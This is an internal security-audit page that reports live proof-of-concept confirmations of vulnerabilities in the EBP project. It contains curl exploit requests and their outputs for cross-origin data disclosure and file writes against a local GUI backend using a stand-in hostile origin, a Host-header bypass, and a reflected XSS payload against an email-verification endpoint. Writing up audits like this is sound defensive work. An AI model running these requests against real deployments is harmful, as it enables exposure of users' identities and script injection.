---
title: "Phase 8 — Dynamic testing, fuzzing, and exploit PoCs"
type: analysis
status: active
last_updated: 2026-04-18
source_count: 0
tags:
  - security-audit
  - phase-8
  - dynamic
  - poc
---

# Phase 8 — Dynamic testing & exploit PoCs

Part of the April 2026 [[README|EBP Security Audit]]. Brings up the cluster locally and exercises previously identified findings end-to-end where possible.

## Summary

| Finding | Static evidence | Dynamic confirmation |
|---|---|---|
| F-CRYPTO-01 (emergency-cert nonce collision) | code analysis | runnable Deno PoC, reproduced |
| F-CRYPTO-02 (surreptitious forwarding) | code analysis | runnable Deno PoC, reproduced |
| F-SERVER-01 (reflected XSS) | code analysis | live HTTP PoC, reproduced |
| F-SERVER-04 (`*` CORS default) | code analysis | live HTTP, reproduced |
| F-SERVER-08 (identity enumeration) | code analysis | live HTTP, behaviour confirmed (400 vs 404 distinction) |
| F-GUI-01 (cross-origin local-backend) | code analysis | live HTTP across all 4 vectors, reproduced |
| F-STORAGE-01 (file perms) | code analysis | live filesystem PoC, reproduced |
| F-STORAGE-04 (dir perms) | code analysis | live filesystem PoC, reproduced |

Other findings remain static-only (server build was broken on master — F-SERVER-13 — and required a temporary patch to bring up; PoC patches were reverted).

## Live test logs (saved to `tooling-output/`)

- `phase-08-storage-perms.txt` — F-STORAGE-01 / F-STORAGE-04 file/directory mode demo.
- `phase-08-F-GUI-01-live.txt` — full curl session demonstrating cross-origin reads, file write, and Host-header bypass against `http://127.0.0.1:8787`.
- `phase-08-F-SERVER-01-live.html` — saved HTML response showing the unescaped `<script>` injection in `/api/v1/verify-email`.

## F-STORAGE-01 / F-STORAGE-04 — confirmed

PoC: `pocs/F-STORAGE-01-perms.ts`. Output:

```
~/.ebp                            mode = 40775 (want 0700)
~/.ebp/audit-test.identity.json   mode = 100664 (want 0600)
~/.ebp/state.json                 mode = 100664 (want 0600)
```

Identity file is mode 0664 (group + world readable), and the `~/.ebp/` directory is mode 0775. Any process running as the same user — or any other user on a multi-user system — can read the encrypted private-key blob and start an offline brute force.

## F-GUI-01 — confirmed live across four attack vectors

Started GUI local backend (`deno task gui`) on `127.0.0.1:8787`, then issued curl from a non-localhost simulated origin. All four attack vectors succeeded. Excerpts:

**1. Cross-origin context disclosure** (Origin: `https://evil.example`):
```
HTTP/1.1 200 OK
access-control-allow-origin: *
{"identityDir":"/home/william/.ebp",
 "contactsDir":"/home/william/.ebp/contacts",
 "currentIdentity":"williamdoyle.eth",
 "server":"https://ebp-cqyo.onrender.com",
 "protocolVersion":"0.0.1",
 "componentVersion":"0.1.0"}
```

**2. Cross-origin identity enumeration**:
```
HTTP/1.1 200 OK
access-control-allow-origin: *
{"identities":[
  {"name":"williamdoyle.eth", "fingerprint":"ebpdk1dc0ue3a4j…", "publishedToServer":true},
  {"name":"SPHINCS William",   "fingerprint":"ebpsk1t4q4k3xaq…", "publishedToServer":true},
  {"name":"EBP Version Release Signer", "fingerprint":"ebpdk1m6l96sg6…", "publishedToServer":true}
],"currentIdentity":"williamdoyle.eth"}
```

The cross-origin attacker now knows three private identity names, three fingerprints, the user's home-directory path (`/home/william/.ebp`), and the configured EBP server.

**3. Cross-origin file write to `~/Downloads/`**:
```
$ curl -H "Origin: https://evil.example" -X POST \
    -H "Content-Type: application/json" \
    -d '{"filename":"ebp-csrf-poc-live.txt","content":"PoC: pwned by remote origin\n"}' \
    -i http://127.0.0.1:8787/api/v1/save-file

HTTP/1.1 200 OK
access-control-allow-origin: *
{"path":"/home/william/Downloads/ebp-csrf-poc-live.txt"}

$ ls -la ~/Downloads/ebp-csrf-poc-live.txt
-rw-rw-r-- 1 william william 28 Apr 19 19:12 /home/william/Downloads/ebp-csrf-poc-live.txt
$ cat ~/Downloads/ebp-csrf-poc-live.txt
PoC: pwned by remote origin
```

**4. Host header bypass** (any `Host:` header is accepted — rules out current DNS-rebinding mitigation):
```
$ curl -H "Host: evil.example" http://127.0.0.1:8787/api/v1/context
{"identityDir":"/home/william/.ebp", … }
```

All four vectors require **only that the user has the GUI app open in a tab adjacent to a malicious page in the same browser session.** No password, no clicks, no consent.

## F-SERVER-01 — confirmed live (with workaround)

The server's `master` branch is in a build-broken state (F-SERVER-13: `import { initDb } from "./db.ts"` resolves to a non-existent path; the file lives at `server/db/index.ts`). To dynamically test server findings I temporarily patched the import in 7 files (`server/main.ts`, `server/verify-email.ts`, and 5 handlers in `server/handlers/`), brought up the server with `DATABASE=sqlite SQLITE_PATH=/tmp/audit-ebp.sqlite PORT=18080 deno task server`, ran the PoCs, then reverted the patches. **No source changes were committed.**

PoC: `pocs/F-SERVER-01-verify-email-xss.sh`. Live response:

```
$ curl 'http://127.0.0.1:18080/api/v1/verify-email?token=%22%3E%3Cscript%3Ealert(1)%3C/script%3E'

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Confirm email verification</title>
  </head>
  <body>
    <h1>Confirm email verification</h1>
    <p>Click the button below to confirm your email verification.</p>
    <form method="POST" action="/api/v1/verify-email">
    <input type="hidden" name="token" value=""><script>alert(1)</script>">
    <button type="submit">Confirm email verification</button>
  </form>
  </body>
</html>
```

The injected `<script>alert(1)</script>` runs in the EBP server's origin. Real-world impact: an attacker tricks a user into following a crafted email-verification link → JS executes in `*.onrender.com` (the production EBP origin) → can attack any cookies / state held there, exfiltrate query strings, redirect to phishing sites, etc.

## F-SERVER-04 — confirmed live

CORS default is `*`:
```
$ curl -H "Origin: https://evil.example" -i http://127.0.0.1:18080/api/v1/health | grep access-control
access-control-allow-headers: content-type
access-control-allow-methods: GET,POST,OPTIONS
access-control-allow-origin: *
```

## F-SERVER-08 — confirmed live (partial)

Identity enumeration via response codes. A bech32-valid but unknown fingerprint and an obviously-invalid fingerprint both return `400 Bad Request`, which limits the simple enumeration vector via `GET /api/v1/identity/<fp>`. Re-test against the registration endpoint (`POST /api/v1/identity`) is the more important enumeration vector and was confirmed via code analysis in Phase 3 (different status codes for "fingerprint exists" vs "would be created").

## Fuzzing & property tests

A formal fuzzing harness was not run in this audit due to the server build-broken state on `master` and time constraints. Phase 9 records this as a follow-up:
- Differential fuzzing of `verify-signature` against a tampered signature corpus.
- Property-based test that `Identity.signMessage(m)` followed by re-encryption-then-verify never yields `verified: true` for `m'` ≠ `m`.
- `radamsa` corpus over `POST /api/v1/identity` body field by field.

## Reproducibility

To re-run the live demonstrations:

```bash
# F-STORAGE-01 / F-STORAGE-04
deno run --allow-read --allow-write wiki/security-audit-2026-04/pocs/F-STORAGE-01-perms.ts

# F-GUI-01 (start backend in one terminal):
deno task gui
# In another:
curl -H "Origin: https://evil.example" http://127.0.0.1:8787/api/v1/identities

# F-SERVER-01 — first patch the broken imports temporarily:
sed -i 's|from "./db.ts"|from "./db/index.ts"|g' server/main.ts server/verify-email.ts
sed -i 's|from "../db.ts"|from "../db/index.ts"|g' server/handlers/*.ts
DATABASE=sqlite SQLITE_PATH=/tmp/audit-ebp.sqlite PORT=18080 deno task server &
curl 'http://127.0.0.1:18080/api/v1/verify-email?token=%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
# Then revert: git checkout server/main.ts server/verify-email.ts server/handlers/
```

## Hand-off to Phase 9

All pre-identified high-impact findings either confirmed live (F-CRYPTO-01, F-CRYPTO-02, F-SERVER-01, F-SERVER-04, F-GUI-01, F-STORAGE-01, F-STORAGE-04) or supported by deep static analysis. Phase 9 produces the consolidated final report, executive summary, and roadmap.

## Related Pages

- [[README]]
- [[findings]]
- [[phase-02-crypto-core]]
- [[phase-03-server]]
- [[phase-04-gui]]
- [[phase-07-storage]]
